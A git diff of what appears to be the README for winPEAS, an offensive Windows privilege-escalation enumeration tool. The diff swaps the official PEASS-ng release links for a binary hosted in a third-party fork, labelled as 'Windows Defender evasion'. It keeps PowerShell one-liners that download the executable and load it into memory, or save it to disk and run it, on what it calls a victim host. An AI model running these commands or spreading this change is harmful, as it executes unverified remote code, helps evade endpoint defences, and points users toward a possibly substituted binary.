@@ -16,10 +16,10 @@ Precompiled binaries:
 - Download the **[latest obfuscated and not obfuscated versions from here](https://github.com/peass-ng/PEASS-ng/releases/latest)** or **compile it yourself** (read instructions for compilation).
 
 ```bash
-# Get latest release
-$url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
+# Get latest clean release (Windows Defender evasion)
+$url = "https://github.com/moscowchill/PEASS-ng-MC/raw/refs/heads/master/winPEAS/winPEASexe/Dotfuscator/Dotfuscated/winPEAS_final.exe"
 
-# One liner to download and execute winPEASany from memory in a PS shell
+# One liner to download and execute winPEAS from memory in a PS shell
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
 
 # The previous cmd in 2 lines
@@ -28,8 +28,8 @@ $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBas
 
 # Download to disk and execute (super noisy)
 $wc = New-Object System.Net.WebClient
-$wc.DownloadFile("https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe", "winPEASany_ofs.exe")
-.\winPEASany_ofs.exe
+$wc.DownloadFile("https://github.com/moscowchill/PEASS-ng-MC/raw/refs/heads/master/winPEAS/winPEASexe/Dotfuscator/Dotfuscated/winPEAS_final.exe", "winPEAS.exe")
+.\winPEAS.exe
 
 # Load from disk in memory and execute:
 $wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS.exe")));
